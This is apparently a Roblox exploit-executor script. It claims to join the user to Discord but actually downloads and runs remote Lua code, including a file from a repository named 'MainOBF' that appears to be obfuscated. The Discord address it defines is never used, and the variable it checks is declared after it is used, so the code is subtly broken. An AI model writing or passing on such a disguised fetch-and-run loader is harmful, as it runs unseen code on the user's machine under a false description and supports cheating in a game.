if syn and syn.request then
	RequestFunction = syn.request
elseif request then
	RequestFunction = request
elseif http and http.request then
	RequestFunction = http.request
elseif http_request then
	RequestFunction = http_request
end

if not RequestFunction then
	return game.Players.LocalPlayer:Kick("Your executor does not support http requests.")
end

local HttpService = game:GetService("HttpService")
local DiscordAPI = "http://127.0.0.1:6463/rpc?v=1"
local RequestFunction


local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))();
local Notify = AkaliNotif.Notify;

wait(1)

Notify({
	Description = "Joining Discord... ( Only for application , not browser. )";
	Title = "Message";
	Duration = 5;
})
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/kyuoso/MainOBF/main/1.lua"))()
